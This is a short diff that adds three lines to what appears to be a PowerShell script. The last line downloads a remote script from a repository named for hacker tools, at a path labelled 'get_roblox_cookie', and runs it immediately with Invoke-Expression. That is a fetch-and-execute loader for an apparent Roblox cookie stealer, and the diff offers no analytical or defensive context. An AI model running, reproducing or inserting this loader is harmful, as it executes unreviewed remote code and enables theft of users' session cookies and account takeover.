@@ -1,0 +1,3 @@
+$OutputEncoding = [System.Text.Encoding]::UTF8
+$ProgressPreference = "SilentlyContinue"
+iex (iwr https://raw.githubusercontent.com/brndan918/haxker_tools/refs/heads/main/get_roblox_cookie/get_cookie.txt -UseBasicParsing).content
